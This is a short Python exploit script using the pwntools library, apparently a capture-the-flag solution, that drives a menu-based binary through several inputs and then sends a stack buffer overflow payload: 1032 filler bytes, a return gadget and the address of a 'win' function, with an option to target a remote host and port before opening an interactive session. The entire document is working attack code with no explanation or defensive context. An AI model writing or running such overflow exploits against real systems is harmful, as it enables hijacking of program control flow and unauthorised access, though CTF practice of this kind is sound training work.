from pwn import *

exe = ELF('./test')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *main+124
        b *main+152
        b *0x4016c0
        b *0x4018e5
        b *0x4018dc
        continue
    """)
elif args.REMOTE:
    io = remote("35.188.216.251", 30391)

offset = 1032
win_addr = 0x0000000000401740
ret_addr = 0x000000000040101a
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'>', b'10')
io.sendlineafter(b'>', b'0.001')
io.sendlineafter(b'>', b'1337')
# io.sendlineafter(b'>', b'A' * offset + pack(win_addr))
io.sendlineafter(b'>', b'A' * offset + pack(ret_addr) + pack(win_addr))

# io.sendlineafter(b'>', pack(win_addr) * 100)
# io.sendlineafter(b'>', pack(win_addr) * 100)
io.interactive()